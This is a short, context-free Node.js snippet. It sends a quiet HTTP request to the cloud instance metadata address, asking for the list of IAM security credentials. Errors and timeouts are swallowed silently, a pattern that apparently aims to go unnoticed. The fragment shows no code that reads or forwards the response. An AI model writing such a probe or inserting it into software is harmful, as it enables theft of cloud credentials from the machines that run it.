const r = require("http").get(
  { host: "169.254.169.254", path: "/latest/meta-data/iam/security-credentials/", timeout: 3000 });
r.on("error", () => {}); r.on("timeout", () => r.destroy());
